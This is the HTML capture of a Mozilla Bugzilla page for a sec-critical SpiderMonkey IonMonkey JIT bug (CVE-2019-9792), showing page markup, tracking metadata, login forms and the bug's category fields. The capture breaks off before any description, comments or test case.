<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1532599 - (CVE-2019-9792) Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1532599">
<meta property="og:description"
      content="RESOLVED (nicolas.b.pierron) in Core - JavaScript Engine: JIT. Last updated 2020-11-03.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="P1">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1532599 - (CVE-2019-9792) Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1532599&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1532599">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1532599">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/yui.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/global.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/util.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"comments\":{\"cf_tracking_firefox66\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox68\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox67\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr60\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"}},\"types\":[\"tracking\"],\"flags\":{\"tracking\":{\"cf_status_firefox65\":\"wontfix\",\"cf_status_firefox_esr91\":\"---\",\"cf_status_firefox66\":\"fixed\",\"cf_tracking_firefox95\":\"---\",\"cf_status_firefox67\":\"fixed\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_status_firefox95\":\"---\",\"cf_status_firefox68\":\"fixed\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox68\":\"+\",\"cf_tracking_firefox66\":\"+\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_firefox_esr60\":\"fixed\",\"cf_tracking_firefox93\":\"---\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_status_firefox94\":\"---\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_tracking_firefox_esr60\":\"66+\",\"cf_tracking_firefox67\":\"+\"},\"project\":{\"cf_root_cause\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_a11y_review_project_flag\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_webcompat_priority\":\"---\"}}}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1532599;
  BUGZILLA.bug_title = '1532599 - (CVE-2019-9792) Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script';
  BUGZILLA.bug_summary = 'Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1532599';
  BUGZILLA.bug_keywords = 'csectype-other, regression, sec-critical',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/field.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/comments.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1532599">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1532599"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1532599 - (CVE-2019-9792) Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="3nOM6gSQ5XjTmxarUCqgdry4ckcb3z0SmvEXe699V9UDIbin5KHUbpdb3oBtOYfin4dzGyTTWZzLdug2906L54q3YlDB2C5hhV7gdTxpfY9wQAJvlmhoS62aFndCfnzJwOc5rF6fbFmibzKioZ8eIoyTeqK17yZcc5jyjPmAGhdEvZScNREYgjLaBAyAwsyMWiI06Z85TDkwS4lvrRbdjK5ACYMwWxBHrVsceZCy8yJD7zF4rttPu3AYOGqouFF8">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1532599" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623398-jt4R7dT89gO8L1JQEC7mUf_nHqY6U5-w--oZJ3lf8uI">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1532599" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1532599" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1532599">Bug 1532599</a>
          <span class="edit-hide">(CVE-2019-9792)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2019-03-05 04:08 PST" data-time="1551787701">3 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2019-03-26 07:14 PDT" data-time="1553609658">3 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">Spidermonkey: Ion<wbr>Monkey leaks JS<wbr>_OPTIMIZED<wbr>_OUT magic value to script</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Core :: JavaScript Engine: JIT, defect, P1)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Core
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Core</div>
            <div class="description">Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox">Firefox</a> product. (<a href="https://wiki.mozilla.org/Modules/All#Core">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Core"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core&component=JavaScript%20Engine%3A%20JIT#JavaScript%20Engine%3A%20JIT" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">JavaScript Engine: JIT
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Core :: JavaScript Engine: JIT</div>
            <div class="description">JavaScript engine's JIT compilers</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;component=JavaScript%20Engine%3A%20JIT&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Core&amp;component=JavaScript%20Engine%3A%20JIT&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Core&amp;component=JavaScript%20Engine%3A%20JIT"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core" data-component="JavaScript Engine: JIT"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-version"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            65 Branch

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">P1
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            critical

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;flags&quot;:[{&quot;status&quot;:&quot;-&quot;,&quot;name&quot;:&quot;qe-verify&quot;}],&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr60&quot;:&quot;66+&quot;,&quot;cf_tracking_firefox67&quot;:&quot;+&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;priority&quot;:&quot;P1&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr60&quot;:&quot;fixed&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;id&quot;:1532599,&quot;dupe_of&quot;:null,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;csectype-other&quot;,&quot;regression&quot;,&quot;sec-critical&quot;],&quot;cf_tracking_firefox66&quot;:&quot;+&quot;,&quot;cf_tracking_firefox68&quot;:&quot;+&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox68&quot;:&quot;fixed&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox67&quot;:&quot;fixed&quot;,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;target_milestone&quot;:&quot;mozilla68&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_status_firefox65&quot;